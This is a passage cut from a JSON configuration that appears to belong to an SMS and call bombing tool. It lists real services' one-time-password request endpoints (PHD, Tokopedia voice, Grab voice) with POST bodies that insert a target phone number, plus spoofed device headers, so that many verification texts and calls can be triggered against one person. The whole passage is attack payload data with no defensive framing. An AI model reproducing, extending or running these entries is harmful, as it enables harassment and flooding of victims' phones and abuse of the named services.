        "method": "POST",
        "provider": "all",
        "data": {
            "phone": "{c}",
            "action": "registration"
        }
    },
    {
        "name": "[SMS] PHD-Delivery",
        "url": "https://phd.co.id/en/users/sendOTP",
        "method": "POST",
        "provider": "all",
        "data": {
            "phone_number": "{c}"
        }
    },
    {
        "name": "[CALL] Tokopedia-Voice",
        "url": "https://accounts.tokopedia.com/otp/c/page/request-otp-v2",
        "method": "POST",
        "provider": "all",
        "headers": {
            "X-Device-ID": "{random_device_id}",
            "X-Source": "android"
        },
        "data": {
            "msisdn": "{c}",
            "otp_type": "112",
            "mode": "call"
        }
    },
    {
        "name": "[CALL] Grab-Voice",
        "url": "https://api.grab.com/grabid/v1/phone/otp",
